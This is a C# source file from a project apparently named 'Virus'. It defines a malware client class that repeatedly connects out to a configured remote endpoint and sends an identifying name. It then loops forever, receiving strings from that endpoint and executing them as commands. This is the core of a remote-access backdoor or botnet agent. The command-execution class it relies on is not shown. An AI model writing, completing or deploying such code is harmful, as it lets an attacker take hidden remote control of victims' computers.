using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Virus
{
    public class Client
    {
        public IPEndPoint EndPoint;
        public Socket Socket;

        public Client(IPEndPoint endPoint, Socket socket)
        {
            EndPoint = endPoint;
            Socket = socket;
        }

        public void CheckCommand(byte[] buffer)
        {
            string request;
            int bytesRecorded = Socket.Receive(buffer);
            request = Encoding.UTF8.GetString(buffer, 0, bytesRecorded);
            Command command = new Command(request);
            command.Execute();
        }

        public void WaitForConnect()
        {
            while (!Socket.Connected)
            {
                try
                {
                    Socket.Connect(EndPoint);
                }
                catch
                {
                    Thread.Sleep(5000);
                }
            }
        }

        public void Handle()
        {
            try
            {
                Socket.Send(Encoding.UTF8.GetBytes(Settings.Name));
                byte[] buffer = new byte[8196];
                while (true)
                {
                    CheckCommand(buffer);
                }
            }
            catch
            {

            }
        }
    }
}
